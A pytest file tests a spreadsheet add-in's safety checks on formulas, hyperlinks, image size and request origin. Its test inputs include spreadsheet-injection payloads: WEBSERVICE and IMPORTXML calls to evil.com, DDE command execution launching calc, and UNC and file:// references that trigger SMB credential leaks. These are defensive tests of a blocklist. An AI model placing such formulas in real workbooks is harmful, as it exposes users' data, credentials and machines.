from __future__ import annotations

import pytest
from pydantic import ValidationError

from server.app.main import app, ALLOWED_ORIGINS
from server.app.models import (
    AddImageAction,
    SetHyperlinkAction,
    WriteFormulasAction,
)
from server.app.safety import (
    base64_within_image_limit,
    dangerous_formula,
    dangerous_hyperlink_address,
)


def test_dangerous_formula_detects_network_functions() -> None:
    assert dangerous_formula("=WEBSERVICE(\"http://evil.com\")") == "WEBSERVICE"
    assert dangerous_formula('=IF(A1,WEBSERVICE("http://evil.com"))') == "WEBSERVICE"
    assert dangerous_formula("=IMPORTXML(\"http://evil.com\")") == "IMPORTXML"
    assert dangerous_formula("=FILTERXML(A1,\"//x\")") == "FILTERXML"


def test_dangerous_formula_detects_phishing_and_exec() -> None:
    assert dangerous_formula('=HYPERLINK("http://evil.com")') == "HYPERLINK"
    assert dangerous_formula("=EXEC(\"calc\")") == "EXEC"
    assert dangerous_formula("=CALL(\"x\",\"y\",\"z\")") == "CALL"
    assert dangerous_formula("=REGISTER(\"x\")") == "REGISTER"


def test_hyperlink_can_be_allowlisted() -> None:
    # 配置 safety.allowHyperlink=true 时放行 HYPERLINK，其余危险函数仍拦截。
    assert (
        dangerous_formula('=HYPERLINK("http://example.com")', allow_hyperlink=True)
        is None
    )
    assert (
        dangerous_formula(
            '=IF(A1,HYPERLINK("http://example.com"))', allow_hyperlink=True
        )
        is None
    )
    # 放行 HYPERLINK 不影响 WEBSERVICE 等其它函数。
    assert (
        dangerous_formula(
            '=WEBSERVICE("http://evil.com")', allow_hyperlink=True
        )
        == "WEBSERVICE"
    )


def test_dangerous_formula_detects_dde() -> None:
    assert dangerous_formula("=cmd|'/c calc'!A0") == "DDE"
    assert dangerous_formula("=  cmd'/c calc'!A0") == "DDE"


def test_safe_formula_passes() -> None:
    assert dangerous_formula("=SUM(A1:A10)") is None
    assert dangerous_formula("=XLOOKUP(A1,B:B,C:C)") is None
    assert dangerous_formula("=VLOOKUP(A1,B1:C10,2,FALSE)") is None
    assert dangerous_formula("=SUMPRODUCT(ISNUMBER(SEARCH(A1,B2)))") is None
    assert dangerous_formula("") is None


def test_dangerous_formula_detects_unc_and_external_workbook_refs() -> None:
    # UNC 路径引用：Excel 打开时解析外部链接会连 \\host\share（SMB/NTLM 泄露）。
    assert (
        dangerous_formula(r"='\\evil.com\share\[data.xlsx]Sheet1'!A1") == "UNC"
    )
    assert (
        dangerous_formula(r"=SUM('\\evil.com\share\[data.xlsx]Sheet1'!A1:A2)")
        == "UNC"
    )
    # 相对外部工作簿引用。
    assert dangerous_formula("='[report.xlsx]Sheet1'!A1") == "EXTERNAL_REF"
    # 结构化表格引用（Table1[列名]）不受影响。
    assert dangerous_formula("=SUM(Table1[Score])") is None
    assert dangerous_formula("=SUM(A1:A10)") is None


def test_dangerous_hyperlink_address_detects_unc_and_file() -> None:
    # Windows 把 \\ 与 // 都解析为 UNC；点击超链接即触发 SMB 连接。
    assert dangerous_hyperlink_address(r"\\evil.com\share\report.xlsx") == "UNC"
    assert dangerous_hyperlink_address("//evil.com/share") == "UNC"
    assert dangerous_hyperlink_address("file://evil.com/share") == "FILE"
    assert dangerous_hyperlink_address("file:///C:/Windows/win.ini") == "FILE"
    assert dangerous_hyperlink_address("https://example.com") is None
    assert dangerous_hyperlink_address("mailto:test@example.com") is None
    assert dangerous_hyperlink_address("=cmd|'/c calc'!A0") == "DDE"


def test_write_formulas_action_rejects_dangerous_formula() -> None:
    with pytest.raises(ValidationError, match="WEBSERVICE"):
        WriteFormulasAction.model_validate(
            {
                "type": "writeFormulas",
                "sheet": "Sheet1",
                "range": "A1:A1",
                "formulas": [["=WEBSERVICE(\"http://evil.com\")"]],
            }
        )


def test_write_formulas_action_accepts_safe_formula() -> None:
    action = WriteFormulasAction.model_validate(
        {
            "type": "writeFormulas",
            "sheet": "Sheet1",
            "range": "A1:A1",
            "formulas": [["=SUM(A1:A10)"]],
        }
    )
    assert action.formulas == [["=SUM(A1:A10)"]]


def test_set_hyperlink_action_rejects_dde() -> None:
    with pytest.raises(ValidationError, match="注入载体"):
        SetHyperlinkAction.model_validate(
            {
                "type": "setHyperlink",
                "sheet": "Sheet1",
                "range": "A1",
                "address": "=cmd|'/c calc'!A0",
            }
        )


def test_set_hyperlink_action_accepts_web_link() -> None:
    action = SetHyperlinkAction.model_validate(
        {
            "type": "setHyperlink",
            "sheet": "Sheet1",
            "range": "A1",
            "address": "https://example.com",
        }
    )
    assert action.address == "https://example.com"


def test_write_formulas_action_rejects_unc_reference() -> None:
    with pytest.raises(ValidationError, match="UNC"):
        WriteFormulasAction.model_validate(
            {
                "type": "writeFormulas",
                "sheet": "Sheet1",
                "range": "A1:A1",
                "formulas": [["='\\\\evil.com\\share\\[data.xlsx]Sheet1'!A1"]],
            }
        )


def test_set_hyperlink_action_rejects_unc_share() -> None:
    with pytest.raises(ValidationError, match="UNC"):
        SetHyperlinkAction.model_validate(
            {
                "type": "setHyperlink",
                "sheet": "Sheet1",
                "range": "A1",
                "address": "\\\\evil.com\\share\\report.xlsx",
            }
        )


def test_add_image_action_rejects_oversized_base64() -> None:
    # images.maxBytes = 4MB；编码后文本应远小于 8_000_000 的模型上限，
    # 这里用超出 4MB 上限的文本构造一个必超的样例。
    assert not base64_within_image_limit("A" * 8_000_000)
    with pytest.raises(ValidationError, match="上限"):
        AddImageAction.model_validate(
            {
                "type": "addImage",
                "sheet": "Sheet1",
                "base64": "A" * 8_000_000,
                "targetRange": "A1",
            }
        )


def test_base64_within_image_limit_small_payload() -> None:
    assert base64_within_image_limit("iVBORw0KGgo=...")


def test_state_changing_request_from_foreign_origin_is_rejected() -> None:
    from fastapi.testclient import TestClient

    response = TestClient(app).post(
        "/api/settings/model/connections/test",
        json={
            "id": None,
            "label": "测试",
            "baseUrl": "https://example.com",
            "modelId": "gpt-4o",
            "supportsVision": False,
        },
        headers={"Origin": "https://evil.example.com"},
    )
    assert response.status_code == 403
    assert response.json()["detail"]["code"] == "FORBIDDEN_ORIGIN"


def test_state_changing_request_without_origin_is_allowed() -> None:
    from fastapi.testclient import TestClient

    # 不带 Origin（curl/本机脚本/安装器健康检查）应放行，不破坏现有调用方。
    response = TestClient(app).get("/health")
    assert response.status_code == 200


def test_allowed_origins_cover_addin_origins() -> None:
    assert "https://localhost:3000" in ALLOWED_ORIGINS
    assert "https://127.0.0.1:3000" in ALLOWED_ORIGINS
